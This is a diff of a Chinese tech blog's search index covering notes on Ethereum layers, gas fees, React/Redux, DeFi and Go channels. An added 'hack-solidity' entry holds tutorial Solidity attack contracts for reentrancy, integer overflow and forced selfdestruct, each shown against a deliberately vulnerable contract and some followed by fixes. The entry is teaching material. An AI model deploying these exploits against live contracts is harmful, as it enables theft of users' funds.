@@ -1,25 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ETH</title>
-    <url>/2022/03/07/ETH/</url>
-    <content><![CDATA[<figure class="highlight graph"><figcaption><span>LR</span></figcaption><table><tr><td class="code"><pre><span class="line">应用层--&gt;合约层</span><br><span class="line">合约层--&gt;激励层</span><br><span class="line">激励层--&gt;共识层</span><br><span class="line">共识层--&gt;网络层</span><br><span class="line">网络层--&gt;数据层</span><br></pre></td></tr></table></figure>
-
-<h5 id="分层信息"><a href="#分层信息" class="headerlink" title="分层信息"></a>分层信息</h5><ul>
-<li>数据层 存储以太坊区块链的所有数据 本质是数据库</li>
-<li>网络层 ：P2P网络 在以太坊网络层使用KAD</li>
-<li>共识层：规定通过何种方式实现交易记录的过程 </li>
-<li>激励层： 以太坊采用POW(与比特币的pow不同)实现挖矿奖励机制</li>
-<li>合约层： 平台层 通过合约层开发任意的Dapp 实现完整的区块链系统 在以太坊中 就是evm 和智能合约 </li>
-<li>应用：以太坊的最上层 ，主要使用truffle  web3.js</li>
-</ul>
-<p><img src="/images/web3/eth.png" alt="image"></p>
-]]></content>
-      <tags>
-        <tag>ETH</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ETH账户</title>
     <url>/2022/04/05/Account-md/</url>
     <content><![CDATA[<h2 id="账户内部状态成员"><a href="#账户内部状态成员" class="headerlink" title="账户内部状态成员"></a>账户内部状态成员</h2><p>core/state/snapshot/account.go</p>
@@ -151,6 +132,115 @@
       </tags>
   </entry>
   <entry>
+    <title>1-0React-redux</title>
+    <url>/2021/08/28/1-0React-redux/</url>
+    <content><![CDATA[<h1 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h1><h2 id="React声明周期"><a href="#React声明周期" class="headerlink" title="React声明周期"></a>React声明周期</h2><ul>
+<li>Mounting阶段<ul>
+<li>出生</li>
+<li>componentwillMount</li>
+<li>constructor </li>
+<li>render </li>
+<li>componentDidMount</li>
+</ul>
+</li>
+<li>updating<ul>
+<li>长大</li>
+<li>render </li>
+<li>componentDidUpdate</li>
+</ul>
+</li>
+<li>Unmounting 阶段<ul>
+<li>卸载之后要做什么</li>
+<li>componentWillUnmount</li>
+</ul>
+</li>
+</ul>
+<h1 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul>
+<li><p>redux是用于javaScrip的状态容器，提供可以预测化的状态管理 。</p>
+</li>
+<li><p>Redux可以让你构建一致化的应用，测试非常方便</p>
+</li>
+<li><p>还支持界面库，而且体积小2kb</p>
+</li>
+</ul>
+<h2 id="设计初衷"><a href="#设计初衷" class="headerlink" title="设计初衷"></a>设计初衷</h2><ul>
+<li>解决混乱的state变化</li>
+</ul>
+<h2 id="三大核心"><a href="#三大核心" class="headerlink" title="三大核心"></a>三大核心</h2><ul>
+<li><p>单一数据源</p>
+<ul>
+<li>整个应用的state存在一个object tree中</li>
+</ul>
+</li>
+<li><p>state是只读的</p>
+<ul>
+<li>唯一改变state的方法就是触发action,action就是一个普通的对象。<code>store.dispatch</code></li>
+</ul>
+</li>
+<li><h2 id="使用纯函数来执行修改"><a href="#使用纯函数来执行修改" class="headerlink" title="使用纯函数来执行修改"></a>使用纯函数来执行修改</h2></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>React</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2-0ETH_transaction</title>
+    <url>/2021/05/02/2-0ETH-transaction/</url>
+    <content><![CDATA[<h1 id="以太币单位转换"><a href="#以太币单位转换" class="headerlink" title="以太币单位转换"></a>以太币单位转换</h1><h2 id="JS的number存储有限"><a href="#JS的number存储有限" class="headerlink" title="JS的number存储有限"></a>JS的number存储有限</h2><p>JS中证书存储的是一个双精度浮点数，使用64位（8字节）存储。<br>安全存储范围：$[- (2^{53} -1),(2^{53} -1)]$, 小于$10^{17}$</p>
+<p>在DAPP中，还是以太坊项目中关于金额数据均使用BigInt类型。</p>
+<p>不是所有的浏览器兼容bigint </p>
+<h2 id="怎么办？"><a href="#怎么办？" class="headerlink" title="怎么办？"></a>怎么办？</h2><p>bn.js bignumber.js </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var y =10 **17</span><br><span class="line">console.log(y==y+1)  //  true</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="以太币单位转换-1"><a href="#以太币单位转换-1" class="headerlink" title="以太币单位转换"></a>以太币单位转换</h2><p>@  “ethers”: “^4.0.5”</p>
+<ul>
+<li>parseUints()</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//value 0x61923bbe2c31028000</span><br><span class="line">const ethers =require(&#x27;ethers&#x27;)</span><br><span class="line"></span><br><span class="line">const utils = ethers.utils;</span><br><span class="line"></span><br><span class="line">const log =console.log;</span><br><span class="line">let value =utils.bigNumberify(&quot;0x61923bbe2c31028000&quot;);</span><br><span class="line">log(utils.formatUnits(value,&quot;ether&quot;))  //1799.8714</span><br><span class="line">log(utils.commify(utils.formatUnits(value,&quot;ether&quot;)))  //1,799.8714</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//32wei</span><br><span class="line">let gasPrice = utils.parseUnits(&quot;35&quot;,&quot;wei&quot;);</span><br><span class="line">let gasUsed =utils.bigNumberify(21000);</span><br><span class="line">//fee  0.000735 = gasprice * gasUsed </span><br><span class="line">let fee =gasPrice.mul(gasUsed)</span><br><span class="line"></span><br><span class="line">log(&quot;fee&quot;,utils.formatUnits(fee,&#x27;ether&#x27;))</span><br><span class="line"></span><br><span class="line">log(&quot;fee&quot;,utils.formatUnits(fee,&#x27;gwei&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="费用交易机制"><a href="#费用交易机制" class="headerlink" title="费用交易机制"></a>费用交易机制</h1><h2 id="以太币的用途"><a href="#以太币的用途" class="headerlink" title="以太币的用途"></a>以太币的用途</h2><p>提供一种支付交易费用的机制，防止用户滥用交易。</p>
+<h2 id="交易费用机制"><a href="#交易费用机制" class="headerlink" title="交易费用机制"></a>交易费用机制</h2><p>指令级，按步先扣gas费，再执行。</p>
+<h2 id="概念：燃料和费用"><a href="#概念：燃料和费用" class="headerlink" title="概念：燃料和费用"></a>概念：燃料和费用</h2><p>gas * gasprice  &#x3D; fee </p>
+<p>1gas的燃料售价是6.32gwei</p>
+<h2 id="gasUsed-and-gasLimit"><a href="#gasUsed-and-gasLimit" class="headerlink" title="gasUsed and gasLimit"></a>gasUsed and gasLimit</h2><p>gas limit * gas price &#x3D; 交易手续费的上限 </p>
+<p>gas used * gas price &#x3D; 交易支付手续费</p>
+<h2 id="退还剩余燃料"><a href="#退还剩余燃料" class="headerlink" title="退还剩余燃料"></a>退还剩余燃料</h2><p>当在EVM中执行完，就会被退还<br>退还 &#x3D; （Gas limit -Gas Used） * Gas price </p>
+<p>如果gas limit 不足，会交易失败（out of gas），会出现 gas used &#x3D; gas limit<br>不会修改以太坊的状态，会还原到交易之前。</p>
+<h2 id="为什么需要设计Gas-LIMIT"><a href="#为什么需要设计Gas-LIMIT" class="headerlink" title="为什么需要设计Gas LIMIT"></a>为什么需要设计Gas LIMIT</h2><p>帮助用户止损 </p>
+<p>gas奖励旷工。</p>
+<h1 id="交易费用-不可不知的6件事情"><a href="#交易费用-不可不知的6件事情" class="headerlink" title="交易费用 不可不知的6件事情"></a>交易费用 不可不知的6件事情</h1><h2 id="交易演示"><a href="#交易演示" class="headerlink" title="交易演示"></a>交易演示</h2><p>metamask转账</p>
+<h2 id="1-交易费用就是旷工费用"><a href="#1-交易费用就是旷工费用" class="headerlink" title="1. 交易费用就是旷工费用"></a>1. 交易费用就是旷工费用</h2><p>交易完毕之后，就支付给了处理本交易的旷工费用。</p>
+<h2 id="2-参与Token销售的时设定GasLimit"><a href="#2-参与Token销售的时设定GasLimit" class="headerlink" title="2.参与Token销售的时设定GasLimit"></a>2.参与Token销售的时设定GasLimit</h2><h2 id="3-你可以拿回没有用的gas"><a href="#3-你可以拿回没有用的gas" class="headerlink" title="3.你可以拿回没有用的gas"></a>3.你可以拿回没有用的gas</h2><p>可以gas limit适当的设置高一些。</p>
+<h2 id="4-如果想少出，旷工费用，调低gasprice-而不是gasLimit"><a href="#4-如果想少出，旷工费用，调低gasprice-而不是gasLimit" class="headerlink" title="4 如果想少出，旷工费用，调低gasprice 而不是gasLimit"></a>4 如果想少出，旷工费用，调低gasprice 而不是gasLimit</h2><h2 id="5-即使交易失败，也会损失旷工费。"><a href="#5-即使交易失败，也会损失旷工费。" class="headerlink" title="5 即使交易失败，也会损失旷工费。"></a>5 即使交易失败，也会损失旷工费。</h2><p>没有免费的网络资源</p>
+<h2 id="6-利用小工具，合理设置gas-price"><a href="#6-利用小工具，合理设置gas-price" class="headerlink" title="6 利用小工具，合理设置gas price"></a>6 利用小工具，合理设置gas price</h2><p>gasprice 由交易发送者，旷工和智能合约设计者根据市场的供应来决定的。</p>
+]]></content>
+      <tags>
+        <tag>ETH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ETH</title>
+    <url>/2022/03/07/ETH/</url>
+    <content><![CDATA[<figure class="highlight graph"><figcaption><span>LR</span></figcaption><table><tr><td class="code"><pre><span class="line">应用层--&gt;合约层</span><br><span class="line">合约层--&gt;激励层</span><br><span class="line">激励层--&gt;共识层</span><br><span class="line">共识层--&gt;网络层</span><br><span class="line">网络层--&gt;数据层</span><br></pre></td></tr></table></figure>
+
+<h5 id="分层信息"><a href="#分层信息" class="headerlink" title="分层信息"></a>分层信息</h5><ul>
+<li>数据层 存储以太坊区块链的所有数据 本质是数据库</li>
+<li>网络层 ：P2P网络 在以太坊网络层使用KAD</li>
+<li>共识层：规定通过何种方式实现交易记录的过程 </li>
+<li>激励层： 以太坊采用POW(与比特币的pow不同)实现挖矿奖励机制</li>
+<li>合约层： 平台层 通过合约层开发任意的Dapp 实现完整的区块链系统 在以太坊中 就是evm 和智能合约 </li>
+<li>应用：以太坊的最上层 ，主要使用truffle  web3.js</li>
+</ul>
+<p><img src="/images/web3/eth.png" alt="image"></p>
+]]></content>
+      <tags>
+        <tag>ETH</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NFT_masterclass</title>
     <url>/2022/02/19/NFT-masterclass/</url>
     <content><![CDATA[<h1 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h1><ul>
@@ -176,16 +266,13 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Oracle</title>
-    <url>/2022/04/10/Oracle/</url>
-    <content><![CDATA[<p><img src="/images/web3/oracle.png" alt="image"></p>
-<blockquote>
-<p>源码<br><a class="link"   href="https://github.com/darrenli6/defi_example/tree/master/eattheblocks/defi-development-mastery/1-defi-building-blocks/6-oracles" >https://github.com/darrenli6/defi_example/tree/master/eattheblocks/defi-development-mastery/1-defi-building-blocks/6-oracles<i class="fas fa-external-link-alt"></i></a></p>
-</blockquote>
+    <title>Yield_Farming_On_Compound</title>
+    <url>/2022/04/10/Yield-Farming-On-Compound/</url>
+    <content><![CDATA[<p><img src="/images/web3/c1.png" alt="image"></p>
+<p><img src="/images/web3/c2.png" alt="image"></p>
+<p><img src="/images/web3/c3.png" alt="image"></p>
+<p><img src="/images/web3/c4.png" alt="image"></p>
 ]]></content>
-      <tags>
-        <tag>ETH</tag>
-      </tags>
   </entry>
   <entry>
     <title>套利</title>
@@ -201,13 +288,16 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Yield_Farming_On_Compound</title>
-    <url>/2022/04/10/Yield-Farming-On-Compound/</url>
-    <content><![CDATA[<p><img src="/images/web3/c1.png" alt="image"></p>
-<p><img src="/images/web3/c2.png" alt="image"></p>
-<p><img src="/images/web3/c3.png" alt="image"></p>
-<p><img src="/images/web3/c4.png" alt="image"></p>
+    <title>Oracle</title>
+    <url>/2022/04/10/Oracle/</url>
+    <content><![CDATA[<p><img src="/images/web3/oracle.png" alt="image"></p>
+<blockquote>
+<p>源码<br><a class="link"   href="https://github.com/darrenli6/defi_example/tree/master/eattheblocks/defi-development-mastery/1-defi-building-blocks/6-oracles" >https://github.com/darrenli6/defi_example/tree/master/eattheblocks/defi-development-mastery/1-defi-building-blocks/6-oracles<i class="fas fa-external-link-alt"></i></a></p>
+</blockquote>
 ]]></content>
+      <tags>
+        <tag>ETH</tag>
+      </tags>
   </entry>
   <entry>
     <title>compound</title>
@@ -463,6 +553,33 @@
       </tags>
   </entry>
   <entry>
+    <title>hack-solidity</title>
+    <url>/2022/02/04/hack-solidity/</url>
+    <content><![CDATA[<h1 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract EtherStore&#123;</span><br><span class="line">     mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line">         balances[msg.sender] +=msg.value;</span><br><span class="line">     &#125;</span><br><span class="line">     function withdraw() public &#123;</span><br><span class="line">         uint bal = balances[msg.sender];</span><br><span class="line">         require(bal &gt;0);</span><br><span class="line">         // 会调用  fallback方法</span><br><span class="line">         (bool send,) = msg.sender.call&#123;value:bal&#125;(&quot;&quot;);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line">         require(send,&quot;failed to send ether&quot;);</span><br><span class="line">         balances[msg.sender] = 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    EtherStore public etherstore;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherstoreAddress)&#123;</span><br><span class="line">        etherstore = EtherStore(_etherstoreAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable&#123;</span><br><span class="line">        if (address(etherstore).balance &gt;= 1 ether)&#123;</span><br><span class="line">        // 调用</span><br><span class="line">            etherstore.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable&#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether);</span><br><span class="line">        etherstore.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">        etherstore.withdraw();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用withdraw()之后，一直就调用fallback(),然后调用withdraw(),可以跳过判断</p>
+<h1 id="Arithmetic-overflow-ans-underflow"><a href="#Arithmetic-overflow-ans-underflow" class="headerlink" title="Arithmetic overflow ans underflow"></a>Arithmetic overflow ans underflow</h1><p>uint &#x3D; uint 256 </p>
+<p>$$ 0&lt;&#x3D; x &lt;&#x3D; 2^{256}  -1  $$</p>
+<ul>
+<li>overflow&#x2F;underflow</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract TimeLock&#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt;uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime ;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable&#123;</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] +=msg.value ;</span><br><span class="line"></span><br><span class="line">        lockTime[msg.sender] =now +1 weeks;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _second) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _second;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">       require(balances[msg.sender] &gt; 0,&quot;insufficient funds&quot;);</span><br><span class="line">       require(now &gt; lockTime[msg.sender],&quot;  lock time not expired&quot;);</span><br><span class="line">   </span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line"></span><br><span class="line">        (bool successs, )= msg.sender.call&#123;value : amount&#125;(&quot;&quot;);</span><br><span class="line">        require(successs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Attack&#123;</span><br><span class="line">     TimeLock timelock;</span><br><span class="line"></span><br><span class="line">     constructor(TimeLock _timelock) public&#123;</span><br><span class="line">         timelock= TimeLock(_timelock);</span><br><span class="line">     &#125;</span><br><span class="line">     // 收款也需要payable </span><br><span class="line">     fallback() external payable&#123;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function attach() public payable&#123;</span><br><span class="line">         timelock.deposit&#123;value:msg.value&#125;();</span><br><span class="line">         //t ==current lock time </span><br><span class="line">         //find x such that </span><br><span class="line">         // x+ t = 2 **256 =0</span><br><span class="line">         // x= -t</span><br><span class="line">         timelock.increaseLockTime(</span><br><span class="line">             uint(-timelock.lockTime(address(this)))</span><br><span class="line">         );</span><br><span class="line"></span><br><span class="line">         timelock.withdraw();</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ul>
+<li>通过引入安全库。safemath</li>
+</ul>
+<h1 id="Forcefully-send-ether-with-selfdestruct"><a href="#Forcefully-send-ether-with-selfdestruct" class="headerlink" title="Forcefully send ether with selfdestruct"></a>Forcefully send ether with selfdestruct</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.10;</span><br><span class="line"></span><br><span class="line">contract EthGamer&#123;</span><br><span class="line"></span><br><span class="line">     uint public targeAmount = 7 ether;</span><br><span class="line"></span><br><span class="line">     address public winner ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">          require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line"></span><br><span class="line">          uint balance = address(this).balance;</span><br><span class="line"></span><br><span class="line">          require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">          if(balance==targeAmount)&#123;</span><br><span class="line">              winner= msg.sender;</span><br><span class="line">          &#125; </span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function claimReward() public &#123;</span><br><span class="line"></span><br><span class="line">         require(msg.sender == winner , &quot;not winner&quot;);</span><br><span class="line"></span><br><span class="line">         (bool sent ,) = msg.sender.call&#123;value:address(this).balance&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">         require(sent,&quot;failed&quot;);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">   function attack(address payable _target) public payable&#123;</span><br><span class="line"></span><br><span class="line">       selfdestruct(_target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>attack 会调用deposite ,然后会触发winner,结果winner是address:0x0000000000000000000000000000000000000000</p>
+</li>
+<li><p>deposit()方法中加入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">uint public balance;</span><br><span class="line"></span><br><span class="line">function deposit() public payable&#123;</span><br><span class="line"></span><br><span class="line">     require(msg.value == 1 ether ,&quot;you can only send 1 ether&quot;);</span><br><span class="line">     </span><br><span class="line">      balance +=msg.value;</span><br><span class="line"></span><br><span class="line">     require(balance &lt;= targeAmount,&quot;game is over&quot;);</span><br><span class="line"></span><br><span class="line">     if(balance==targeAmount)&#123;</span><br><span class="line">         winner= msg.sender;</span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="access-private-data"><a href="#access-private-data" class="headerlink" title="access private data"></a>access private data</h1><p>0x3505a02BCDFbb225988161a95528bfDb279faD6b</p>
+]]></content>
+  </entry>
+  <entry>
     <title>curve协议</title>
     <url>/2022/03/05/curve/</url>
     <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><ul>
@@ -516,61 +633,6 @@
       <tags>
         <tag>Uniswap V3</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>go-channel</title>
-    <url>/2022/01/26/go-channel/</url>
-    <content><![CDATA[<h1 id="go-并发"><a href="#go-并发" class="headerlink" title="go-并发"></a>go-并发</h1><p>java开启线程 需要消耗1MB<br>go 开启协成 需要消耗2KB</p>
-<h2 id="通过状态检查器"><a href="#通过状态检查器" class="headerlink" title="通过状态检查器"></a>通过状态检查器</h2><p>不断获取切片中的link,并且打印出来<br>按照顺序执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		checkLink(link)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/go/1.png" alt="image"></p>
-<h2 id="如果我想要同时执行它们"><a href="#如果我想要同时执行它们" class="headerlink" title="如果我想要同时执行它们"></a>如果我想要同时执行它们</h2><p>在函数的前面加入了go关键字，代表开辟新的协程</p>
-<p>Main routine ,当运行到go的时候，开辟新的协程 。<br>每一个 go协程不影响 </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		go checkLink(link)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>为什么一瞬间终止呢？因为main协程终止，子协程就会被销毁 。 </p>
-<p><img src="/images/go/2.png" alt="image"></p>
-<h2 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h2><p>实现协程之间的通信 </p>
-<h3 id="通道的创建"><a href="#通道的创建" class="headerlink" title="通道的创建"></a>通道的创建</h3><p>实现字符串类型</p>
-<h3 id="通道的实例"><a href="#通道的实例" class="headerlink" title="通道的实例"></a>通道的实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c := make(chan string)</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		go checkLink(link, c)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fmt.Println(&lt;-c) // 等到通道并且打印</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string, c chan string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		c &lt;- &quot;连接失效&quot; // 为了通道传递消息</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c &lt;- &quot;连接上了&quot;</span><br><span class="line">	fmt.Println(link, &quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>输出结果为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.jd.com 连接上了</span><br><span class="line">连接上了</span><br></pre></td></tr></table></figure>
-<p>开始主协程陷入等待，子协程打印之后，主协程退出，其他协程也退出。</p>
-<p>如果想要全部打印出来，就需要增加多个等待通道的指令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	links := []string&#123;</span><br><span class="line">		&quot;https://www.baidu.com&quot;,</span><br><span class="line">		&quot;https://www.jd.com&quot;,</span><br><span class="line">		&quot;https://www.taobao.com&quot;,</span><br><span class="line">		&quot;https://www.sohu.com&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c := make(chan string)</span><br><span class="line"></span><br><span class="line">	for _, link := range links &#123;</span><br><span class="line">		go checkLink(link, c)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for i := 0; i &lt; len(links); i++ &#123;</span><br><span class="line">		fmt.Println(&lt;-c)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkLink(link string, c chan string) &#123;</span><br><span class="line"></span><br><span class="line">	_, err := http.Get(link)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		fmt.Printf(link, &quot;连接失效&quot;)</span><br><span class="line">		c &lt;- &quot;连接失效&quot; // 为了通道传递消息</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c &lt;- &quot;连接上了&quot;</span><br><span class="line">	fmt.Println(link, &quot;连接上了&quot;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>golang</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hack-solidity</title>
-    <url>/2022/02/04/hack-solidity/</url>
-    <content><![CDATA[<h1 id="Reentrancy"><a href="#Reentrancy" class="headerlink" title="Reentrancy"></a>Reentrancy</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.3;</span><br><span class="line"></span><br><span class="line">contract EtherStore&#123;</span><br><span class="line">     mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">     function deposit() public payable&#123;</span><br><span class="line">         balances[msg.sender] +=msg.value;</span><br><span class="line">     &#125;</span><br><span class="line">     function withdraw() public &#123;</span><br><span class="line">         uint bal = balances[msg.sender];</span><br><span class="line">         require(bal &gt;0);</span><br><span class="line">         // 会调用  fallback方法</span><br><span class="line">         (bool send,) = msg.sender.call&#123;value:bal&#125;(&quot;&quot;);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line">         require(send,&quot;failed to send ether&quot;);</span><br><span class="line">         balances[msg.sender] = 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     function getBalance() public view returns(uint)&#123;</span><br><span class="line">         return address(this).balance;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    EtherStore public etherstore;</span><br><span class="line"></span><br><span class="line">    constructor(address _etherstoreAddress)&#123;</span><br><span 